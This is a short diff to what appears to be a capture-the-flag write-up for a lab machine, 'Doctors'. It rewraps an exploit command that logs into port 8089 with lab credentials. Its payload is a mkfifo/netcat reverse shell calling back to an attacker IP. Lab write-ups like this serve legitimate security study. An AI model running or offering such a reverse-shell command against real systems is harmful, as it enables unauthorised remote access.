@@ -207,7 +207,9 @@ at this exploit requires python2 and other modules we are using remote exploit.
 `command for exploit`
 
 ```shell
-python3 exploit.py --host doctors.htb --port 8089 --lhost 10.10.14.38 --username shaun --password Guitar123 --payload 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.38 4445 >/tmp/f' 
+python3 exploit.py --host doctors.htb --port 8089 --lhost 10.10.14.38 
+--username shaun --password Guitar123 --payload 'rm /tmp/f;mkfifo /tmp/f;
+cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.38 4445 >/tmp/f' 
 ```
 
 
